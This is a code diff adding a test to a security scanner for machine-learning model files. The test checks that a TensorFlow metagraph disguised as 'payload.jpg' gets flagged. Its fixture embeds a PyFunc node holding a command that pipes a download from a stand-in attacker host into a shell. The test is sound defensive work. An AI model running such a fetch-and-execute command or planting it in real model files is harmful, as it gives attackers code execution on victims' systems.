@@ -2,6 +2,7 @@
 
 import bz2
 import gzip
+import importlib
 import json
 import lzma
 import pickle
@@ -9,11 +10,25 @@ import tarfile
 import tempfile
 import zipfile
 from pathlib import Path
+from typing import cast
 
 import pytest
 
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
+
+
+def _build_malicious_tf_metagraph() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.meta_info_def.meta_graph_version = "modelaudit_directory_route_test"
+    node = metagraph.graph_def.node.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
+    return cast(bytes, metagraph.SerializeToString())
 
 
 def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
@@ -217,6 +232,17 @@ class TestDirectoryFileFiltering:
 
         assert results["files_scanned"] == 1
         assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_malicious_tf_metagraph_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        disguised_payload = tmp_path / "payload.jpg"
+        disguised_payload.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_malicious_tf_metagraph())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "tf_metagraph" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Dangerous TensorFlow operation: PyFunc" for issue in results.issues)
 
     @pytest.mark.parametrize("filename", [".payload", "Makefile", "package.json", "CHANGELOG"])
     def test_disguised_pickle_with_default_hidden_or_basename_skip_is_scanned(
